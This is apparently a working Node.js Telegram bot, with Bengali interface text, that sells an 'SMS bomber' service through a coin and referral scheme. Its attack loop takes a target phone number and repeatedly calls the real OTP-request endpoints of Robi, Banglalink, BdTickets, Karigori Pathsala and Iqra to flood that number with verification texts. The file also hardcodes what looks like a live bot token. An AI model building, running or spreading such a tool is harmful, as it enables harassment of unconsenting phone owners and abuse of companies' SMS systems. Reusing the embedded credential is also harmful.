const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস
const dbFile = 'users.json';
let users = {};
if (fs.existsSync(dbFile)) { 
    try { users = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { users = {}; }
}
function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }

http.createServer((req, res) => { res.write("S.R.M Engine Online!"); res.end(); }).listen(process.env.PORT || 3000);

// --- ডেকোরেটেড রঙিন মেনু (Emoji Buttons) ---
const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '👤 প্রোফাইল ও ব্যালেন্স' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '📢 অফিশিয়াল চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    if (!users[userId]) {
        users[userId] = { balance: 0, lastBonus: 0, step: '', name: msg.from.first_name || "User" };
        if (text.startsWith('/start ') && text.split(' ')[1] !== userId) {
            const refId = text.split(' ')[1];
            if (users[refId]) { users[refId].balance += 1; bot.sendMessage(refId, `🎊 অভিনন্দন! আপনার রেফারে একজন জয়েন করায় আপনি **১ কয়েন** পেয়েছেন।`); }
        }
        saveDB();
    }

    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start' && !text.startsWith('/start')) {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন করুন।\n\n📢 লিংক: ${channelLink}\n\nজয়েন করে আবার /start দিন।`);
    }

    // --- /start মেসেজ ডেকোরেশন ---
    if (text === '/start' || text.startsWith('/start')) {
        const welcomeMsg = `
⚡ **S.R.M TELECOM ULTIMATE** ⚡
━━━━━━━━━━━━━━━━━━━━
👋 স্বাগতম, **${msg.from.first_name}**! 

🔥 এটি বাংলাদেশের সবচেয়ে শক্তিশালী ওটিপি সার্ভিস। 
এখানে আপনি পাবেন:
✅ **Robi Next-Gen OTP**
✅ **BdTickets (Port 20100)**
✅ **Karigori Pathsala Special**
✅ **Iqra & Banglalink Fast API**

💰 আপনার বর্তমান ব্যালেন্স: **${users[userId].balance} Coins**
━━━━━━━━━━━━━━━━━━━━
👇 নিচের মেনু থেকে একটি অপশন বেছে নিন:`;
        
        return bot.sendMessage(chatId, welcomeMsg, { parse_mode: "Markdown", ...mainMenu });
    }

    if (text === '👤 প্রোফাইল ও ব্যালেন্স') {
        const bal = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 **ব্যবহারকারী:** ${users[userId].name}\n🆔 **আপনার আইডি:** \`${userId}\`\n💰 **মোট কয়েন:** ${bal}`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ দুঃখিত! ২৪ ঘণ্টা পর আবার বোনাস নিতে পারবেন।");
        users[userId].balance += 2;
        users[userId].lastBonus = now;
        saveDB();
        return bot.sendMessage(chatId, "✅ অভিনন্দন! আপনি **২ কয়েন** ফ্রি বোনাস পেয়েছেন।");
    }

    if (text === '🔗 রেফার করুন') {
        const refLink = `https://t.me/reffer_incomebdbot?start=${userId}`; 
        return bot.sendMessage(chatId, `🔗 **আপনার রেফার লিঙ্ক:**\n${refLink}\n\nপ্রতিটি সফল রেফারে পাবেন **১ কয়েন**!`);
    }

    // --- অ্যাটাক লুপ (আপনার দেওয়া সব নিখুঁত এপিআই সহ) ---
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ আপনার ব্যালেন্স নেই! দয়া করে বোনাস নিন বা রেফার করুন।");
        users[userId].step = 'num';
        saveDB();
        return bot.sendMessage(chatId, "📱 টার্গেট নম্বরটি দিন (১১ ডিজিট):", { reply_markup: { remove_keyboard: true } });
    }

    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text;
        users[userId].step = 'amount';
        saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS পাঠাতে চান? (১-৩০):");
    }

    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি SMS সম্ভব।");
        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = '';
        saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যাটাক শুরু হয়েছে...`, mainMenu);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            // ১. Robi (Next-Gen Header)
            try { await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', [{"msisdn": target}], { headers: { 'Accept': 'text/x-component', 'next-action': '7f059ca75e4421bcef70abad89cb5bb05cba717c30', 'X-Requested-With': 'mark.via.gp' }, timeout: 4000 }); success++; } catch (e) {}

            // ২. BdTickets (Original 20100)
            try { await axios.post('https://api.bdtickets.com:20100/v1/auth', { "createUserCheck": true, "phoneNumber": "+88" + target, "applicationChannel": "WEB_APP" }, { headers: { 'Content-Type': 'application/json;charset=UTF-8' }, timeout: 4000 }); success++; } catch (e) {}

            // ৩. Karigori (Options + Get)
            try { await axios.options(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`); await axios.get(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`); success++; } catch (e) {}

            // ৪. Iqra & Banglalink
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`); success++; } catch (e) {}
            try { await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', { "mobile": target }); success++; } catch (e) {}

            await new Promise(r => setTimeout(r, 4500)); 
        }
        bot.sendMessage(chatId, `✅ **অ্যাটাক সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল হিট: ${success}টি`, mainMenu);
    }
});
